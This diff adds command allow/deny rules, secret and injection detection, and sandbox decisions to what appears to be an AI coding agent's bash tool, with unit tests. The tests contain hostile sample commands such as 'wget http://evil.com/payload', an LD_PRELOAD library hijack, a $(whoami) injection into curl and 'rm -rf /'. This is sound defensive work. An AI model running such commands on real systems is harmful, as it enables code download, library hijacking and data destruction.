@@ -584,6 +584,231 @@ fn classify_git_command(command: &str) -> CommandIntent {
 }
 
 // ---------------------------------------------------------------------------
+// bashPermissions — command-level allow/deny list matching
+// ---------------------------------------------------------------------------
+
+/// A compiled command-level permission rule.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct CommandPermissionRule {
+    /// The original pattern string.
+    pub pattern: String,
+    /// Whether the rule matches prefix (`cmd:*`) or exact (`cmd`).
+    prefix: bool,
+    /// The command or prefix to match.
+    target: String,
+}
+
+impl CommandPermissionRule {
+    /// Parse a permission rule string.
+    ///
+    /// Formats:
+    /// - `"rm"` — exact command match
+    /// - `"git:*"` — prefix match (any command starting with `git`)
+    /// - `"npm install:*"` — prefix match on full command string
+    #[must_use]
+    pub fn parse(pattern: &str) -> Self {
+        let trimmed = pattern.trim();
+        if let Some(prefix) = trimmed.strip_suffix(":*") {
+            Self {
+                pattern: trimmed.to_string(),
+                prefix: true,
+                target: prefix.to_string(),
+            }
+        } else {
+            Self {
+                pattern: trimmed.to_string(),
+                prefix: false,
+                target: trimmed.to_string(),
+            }
+        }
+    }
+
+    /// Check whether this rule matches a given command string.
+    #[must_use]
+    pub fn matches(&self, command: &str) -> bool {
+        let cmd = extract_first_command(command);
+        if self.prefix {
+            cmd.starts_with(&self.target) || command.trim().starts_with(&self.target)
+        } else {
+            cmd == self.target
+        }
+    }
+}
+
+/// Policy-level allow/deny lists for bash commands.
+#[derive(Debug, Clone, PartialEq, Eq, Default)]
+pub struct BashPermissionPolicy {
+    allow_rules: Vec<CommandPermissionRule>,
+    deny_rules: Vec<CommandPermissionRule>,
+}
+
+impl BashPermissionPolicy {
+    /// Create a new policy from raw rule strings.
+    #[must_use]
+    pub fn new(allow: &[String], deny: &[String]) -> Self {
+        Self {
+            allow_rules: allow
+                .iter()
+                .map(|s| CommandPermissionRule::parse(s))
+                .collect(),
+            deny_rules: deny
+                .iter()
+                .map(|s| CommandPermissionRule::parse(s))
+                .collect(),
+        }
+    }
+
+    /// Check a command against the policy.
+    ///
+    /// Deny rules are evaluated first (short-circuit). If an allow list is
+    /// non-empty, commands must match at least one allow rule to pass.
+    #[must_use]
+    pub fn check(&self, command: &str) -> ValidationResult {
+        // 1. Deny rules always win.
+        for rule in &self.deny_rules {
+            if rule.matches(command) {
+                return ValidationResult::Block {
+                    reason: format!("Command blocked by deny rule '{}'", rule.pattern),
+                };
+            }
+        }
+
+        // 2. If allow list is non-empty, command must match at least one.
+        if !self.allow_rules.is_empty() {
+            let allowed = self.allow_rules.iter().any(|rule| rule.matches(command));
+            if !allowed {
+                return ValidationResult::Block {
+                    reason: "Command not in allowlist".to_string(),
+                };
+            }
+        }
+
+        ValidationResult::Allow
+    }
+}
+
+// ---------------------------------------------------------------------------
+// bashSecurity — detect secrets, env leakage, injection patterns
+// ---------------------------------------------------------------------------
+
+/// Patterns that suggest secrets or credentials in a command.
+const SECRET_PATTERNS: &[&str] = &[
+    "password=",
+    "passwd=",
+    "secret=",
+    "token=",
+    "api_key=",
+    "apikey=",
+    "api-key=",
+    "access_key=",
+    "secret_key=",
+    "private_key=",
+    "auth_token=",
+    "bearer ",
+    "authorization:",
+    "AWS_SECRET_ACCESS_KEY=",
+    "AWS_ACCESS_KEY_ID=",
+    "GITHUB_TOKEN=",
+    "OPENAI_API_KEY=",
+    "ANTHROPIC_API_KEY=",
+];
+
+/// Shell injection patterns that bypass normal command parsing.
+const INJECTION_PATTERNS: &[&str] = &["$(", "`", "eval ", "exec ", "source ", ". /"];
+
+/// Dangerous environment variable manipulations.
+const DANGEROUS_ENV_PATTERNS: &[&str] = &[
+    "LD_PRELOAD=",
+    "LD_LIBRARY_PATH=",
+    "DYLD_INSERT_LIBRARIES=",
+    "DYLD_LIBRARY_PATH=",
+    "PYTHONPATH=",
+    "NODE_OPTIONS=",
+    "PERL5LIB=",
+    "RUBYLIB=",
+];
+
+/// Check a command for security concerns: embedded secrets, injection, and
+/// dangerous environment variable manipulation.
+#[must_use]
+pub fn check_security(command: &str) -> ValidationResult {
+    let lower = command.to_ascii_lowercase();
+
+    // 1. Check for embedded secrets/credentials.
+    for pattern in SECRET_PATTERNS {
+        if lower.contains(&pattern.to_ascii_lowercase()) {
+            return ValidationResult::Warn {
+                message: format!(
+                    "Command may contain embedded credentials (matched '{pattern}'). \
+                     Consider using environment variables or a secrets manager instead."
+                ),
+            };
+        }
+    }
+
+    // 2. Check for dangerous environment variable manipulation.
+    for pattern in DANGEROUS_ENV_PATTERNS {
+        if command.contains(pattern) {
+            return ValidationResult::Warn {
+                message: format!(
+                    "Command sets dangerous environment variable '{pattern}' which could \
+                     alter dynamic linking or runtime behavior."
+                ),
+            };
+        }
+    }
+
+    // 3. Check for shell injection patterns in data-passing commands.
+    let data_commands = ["echo", "curl", "wget", "printf"];
+    let cmd = extract_first_command(command);
+    if data_commands.contains(&cmd.as_str()) {
+        for pattern in INJECTION_PATTERNS {
+            if command.contains(pattern) && !command.starts_with(pattern) {
+                return ValidationResult::Warn {
+                    message: format!(
+                        "Possible shell injection: '{pattern}' found in data-passing command. \
+                         Ensure this is intentional."
+                    ),
+                };
+            }
+        }
+    }
+
+    ValidationResult::Allow
+}
+
+// ---------------------------------------------------------------------------
+// shouldUseSandbox — command-aware sandbox decision
+// ---------------------------------------------------------------------------
+
+use crate::sandbox::SandboxConfig;
+
+/// Determine whether a bash command should run inside a sandbox based on
+/// its semantic intent and the provided sandbox configuration.
+///
+/// Returns `true` if the command should be sandboxed.
+#[must_use]
+pub fn should_use_sandbox(command: &str, config: &SandboxConfig) -> bool {
+    // If sandbox is explicitly disabled, respect that.
+    if config.enabled == Some(false) {
+        return false;
+    }
+
+    let intent = classify_command(command);
+
+    match intent {
+        CommandIntent::ReadOnly => false,
+        CommandIntent::Write => config.enabled == Some(true),
+        CommandIntent::Destructive
+        | CommandIntent::Network
+        | CommandIntent::ProcessManagement
+        | CommandIntent::PackageManagement
+        | CommandIntent::SystemAdmin => true,
+        CommandIntent::Unknown => config.enabled.unwrap_or(true),
+    }
+}
+
+// ---------------------------------------------------------------------------
 // Pipeline: run all validations
 // ---------------------------------------------------------------------------
 
@@ -611,7 +836,13 @@ pub fn validate_command(command: &str, mode: PermissionMode, workspace: &Path) -
     }
 
     // 4. Path validation.
-    validate_paths(command, workspace)
+    let result = validate_paths(command, workspace);
+    if result != ValidationResult::Allow {
+        return result;
+    }
+
+    // 5. Security checks (secrets, injection, env manipulation).
+    check_security(command)
 }
 
 // ---------------------------------------------------------------------------
@@ -1000,5 +1231,172 @@ mod tests {
     #[test]
     fn extracts_plain_command() {
         assert_eq!(extract_first_command("grep -r pattern ."), "grep");
+    }
+
+    // --- bashPermissions ---
+
+    #[test]
+    fn deny_rule_blocks_command() {
+        let policy = BashPermissionPolicy::new(&[], &["rm".to_string()]);
+        assert!(matches!(
+            policy.check("rm -rf /tmp/x"),
+            ValidationResult::Block { reason } if reason.contains("deny rule")
+        ));
+    }
+
+    #[test]
+    fn deny_rule_prefix_blocks_matching_commands() {
+        let policy = BashPermissionPolicy::new(&[], &["npm:*".to_string()]);
+        assert!(matches!(
+            policy.check("npm install malicious-pkg"),
+            ValidationResult::Block { .. }
+        ));
+        assert_eq!(policy.check("ls -la"), ValidationResult::Allow);
+    }
+
+    #[test]
+    fn allowlist_blocks_unlisted_commands() {
+        let policy = BashPermissionPolicy::new(
+            &["ls".to_string(), "cat".to_string(), "grep".to_string()],
+            &[],
+        );
+        assert_eq!(policy.check("ls -la"), ValidationResult::Allow);
+        assert_eq!(policy.check("cat file.txt"), ValidationResult::Allow);
+        assert!(matches!(
+            policy.check("rm -rf /"),
+            ValidationResult::Block { reason } if reason.contains("allowlist")
+        ));
+    }
+
+    #[test]
+    fn deny_overrides_allow() {
+        let policy = BashPermissionPolicy::new(&["git:*".to_string()], &["git push:*".to_string()]);
+        assert_eq!(policy.check("git status"), ValidationResult::Allow);
+        assert!(matches!(
+            policy.check("git push origin main"),
+            ValidationResult::Block { reason } if reason.contains("deny rule")
+        ));
+    }
+
+    #[test]
+    fn empty_policy_allows_everything() {
+        let policy = BashPermissionPolicy::default();
+        assert_eq!(policy.check("rm -rf /"), ValidationResult::Allow);
+        assert_eq!(policy.check("curl evil.com"), ValidationResult::Allow);
+    }
+
+    // --- bashSecurity ---
+
+    #[test]
+    fn warns_on_embedded_password() {
+        assert!(matches!(
+            check_security("curl -u user:password=secret123 https://api.example.com"),
+            ValidationResult::Warn { message } if message.contains("credentials")
+        ));
+    }
+
+    #[test]
+    fn warns_on_api_key_in_command() {
+        assert!(matches!(
+            check_security("OPENAI_API_KEY=sk-1234 python3 script.py"),
+            ValidationResult::Warn { message } if message.contains("credentials")
+        ));
+    }
+
+    #[test]
+    fn warns_on_dangerous_env_var() {
+        assert!(matches!(
+            check_security("LD_PRELOAD=/tmp/evil.so ./program"),
+            ValidationResult::Warn { message } if message.contains("environment variable")
+        ));
+    }
+
+    #[test]
+    fn warns_on_dyld_injection() {
+        assert!(matches!(
+            check_security("DYLD_INSERT_LIBRARIES=/tmp/hook.dylib ./app"),
+            ValidationResult::Warn { message } if message.contains("environment variable")
+        ));
+    }
+
+    #[test]
+    fn warns_on_shell_injection_in_curl() {
+        assert!(matches!(
+            check_security("curl https://example.com/$(whoami)"),
+            ValidationResult::Warn { message } if message.contains("injection")
+        ));
+    }
+
+    #[test]
+    fn allows_clean_commands() {
+        assert_eq!(check_security("ls -la"), ValidationResult::Allow);
+        assert_eq!(check_security("git status"), ValidationResult::Allow);
+        assert_eq!(
+            check_security("cargo build --release"),
+            ValidationResult::Allow
+        );
+    }
+
+    // --- shouldUseSandbox ---
+
+    #[test]
+    fn sandbox_disabled_returns_false() {
+        let config = SandboxConfig {
+            enabled: Some(false),
+            ..SandboxConfig::default()
+        };
+        assert!(!should_use_sandbox("curl evil.com", &config));
+        assert!(!should_use_sandbox("rm -rf /", &config));
+    }
+
+    #[test]
+    fn sandbox_enabled_for_network_commands() {
+        let config = SandboxConfig::default();
+        assert!(should_use_sandbox("curl https://example.com", &config));
+        assert!(should_use_sandbox("wget http://evil.com/payload", &config));
+    }
+
+    #[test]
+    fn sandbox_enabled_for_destructive_commands() {
+        let config = SandboxConfig::default();
+        assert!(should_use_sandbox("rm -rf /important", &config));
+    }
+
+    #[test]
+    fn sandbox_enabled_for_package_management() {
+        let config = SandboxConfig::default();
+        assert!(should_use_sandbox("npm install sketchy-pkg", &config));
+        assert!(should_use_sandbox("pip install something", &config));
+    }
+
+    #[test]
+    fn sandbox_enabled_for_system_admin() {
+        let config = SandboxConfig::default();
+        assert!(should_use_sandbox("sudo chmod 777 /etc/passwd", &config));
+    }
+
+    #[test]
+    fn no_sandbox_for_read_only() {
+        let config = SandboxConfig::default();
+        assert!(!should_use_sandbox("ls -la", &config));
+        assert!(!should_use_sandbox("cat file.txt", &config));
+        assert!(!should_use_sandbox("grep pattern file", &config));
+    }
+
+    #[test]
+    fn sandbox_for_write_only_when_explicitly_enabled() {
+        let enabled = SandboxConfig {
+            enabled: Some(true),
+            ..SandboxConfig::default()
+        };
+        let default = SandboxConfig::default();
+        assert!(should_use_sandbox("cp src dst", &enabled));
+        assert!(!should_use_sandbox("cp src dst", &default));
+    }
+
+    #[test]
+    fn sandbox_for_unknown_commands_by_default() {
+        let config = SandboxConfig::default();
+        assert!(should_use_sandbox("some-unknown-binary --flag", &config));
     }
 }
